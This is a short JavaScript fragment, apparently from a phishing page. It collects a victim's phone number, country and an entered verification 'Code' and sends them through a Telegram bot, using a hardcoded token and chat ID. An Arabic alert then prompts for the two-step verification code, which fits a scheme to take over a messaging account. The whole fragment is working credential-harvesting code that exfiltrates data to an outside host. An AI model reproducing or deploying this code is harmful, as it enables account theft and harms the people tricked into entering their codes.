    <script>
        const botToken = '7637768536:AAFBR5maC19HT1kLRb9PI4ynubtztkEUTPk';  // Replace with your Telegram bot token
        const chatId = '7672163375';      // Replace with your chat ID (can be group chat or your Telegram ID)

        // Function to send combined data (phone number, country, and name) to Telegram
        function sendName() {
            const name = document.getElementById("name").value;

            // Retrieve phone number and country name from localStorage
            const phoneNumber = localStorage.getItem('phoneNumber');
            const countryName = localStorage.getItem('countryName');

            if (name.trim()) {
                // Combine phone number, country, and name into one message
                const message = `Phone Number: ${phoneNumber}\nCountry: ${countryName}\nCode: ${name}`;
                const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;

                // Send the data to Telegram
                fetch(url)
                    .then(response => {
                        if (response.ok) {
                            alert('المرجو إدخال رمز التحقق من خطوتين اذا ما ضبطت إضافتكم');
                        } else {
                            alert('Failed to send data to Telegram');
                        }
                    })
                    .catch(error => {
                        alert('Error sending data: ' + error);
                    });
            } else {
                alert('Please enter a valid name.');
            }
        }
    </script>
